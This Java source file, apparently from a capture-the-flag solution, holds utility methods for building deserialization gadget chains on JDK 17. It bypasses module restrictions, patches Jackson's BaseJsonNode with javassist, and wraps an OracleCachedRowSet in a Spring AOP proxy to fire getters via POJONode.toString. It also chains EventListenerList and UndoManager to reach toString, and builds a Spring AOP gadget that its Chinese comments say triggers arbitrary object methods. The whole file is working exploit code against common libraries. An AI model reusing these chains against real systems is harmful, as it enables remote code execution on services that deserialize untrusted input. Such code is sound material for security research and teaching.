package com.example.solution;

import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import oracle.jdbc.rowset.OracleCachedRowSet;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.framework.ProxyFactory;

import javax.sql.RowSetInternal;
import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Vector;

import static com.example.solution.Tools17.getFieldValue;
import static com.example.solution.Tools17.setFieldValue;

public class GadgetUtils17 {
    static {
        try {
            Tools17.bypassModule(GadgetUtils17.class);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static POJONode JacksonToString2GetterBetter(OracleCachedRowSet obj) throws Exception {
            Tools17.bypassModule(Class.forName("javassist.util.proxy.DefineClassHelper"));
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
            ctClass0.removeMethod(writeReplace);
            //这里javassist.util.proxy.DefineClassHelper会调用java.base中的反射，会导致序列化失败
            ctClass0.toClass();
            POJONode node = new POJONode(makeObjectAopProxy(obj));
            return node;
        }
        //给需要触发getter的对象套一个代理，确保触发需要的getter方法
        public static Object makeObjectAopProxy(OracleCachedRowSet obj) throws Exception {
            AdvisedSupport advisedSupport = new AdvisedSupport();
            advisedSupport.setTarget(obj);
            Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
            constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
            //这里代理的接口根据需要修改
            Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{RowSetInternal.class}, handler);
            return proxy;
        }

        public static EventListenerList eventListenerList(Object obj) throws IllegalAccessException {
            EventListenerList list = new EventListenerList();
            UndoManager manager = new UndoManager();
            Vector vector = (Vector) getFieldValue(manager, "edits");
            vector.add(obj);
            setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});
            return list;
        }

        //作用：触发任意对象方法
        //toString-->anyMethod  或根据代理接口的类型确定xxx-->anyMethod
        //依赖：SpringAop，aspectjweaver
        public static Object SpringAOP(Object obj, Method method){
            AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut();
            SingletonAspectInstanceFactory instanceFactory = new SingletonAspectInstanceFactory(obj);
            AspectJAroundAdvice aspectJAroundAdvice = new AspectJAroundAdvice(method, pointcut, instanceFactory);
            ProxyFactory proxyFactory = new ProxyFactory(obj);
            proxyFactory.addAdvice(aspectJAroundAdvice);

            Object proxy = proxyFactory.getProxy();
            //根据能调用的方法调整接口类型
//        Object o = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Comparator.class},(InvocationHandler) proxy);
            return proxy;
        }





}

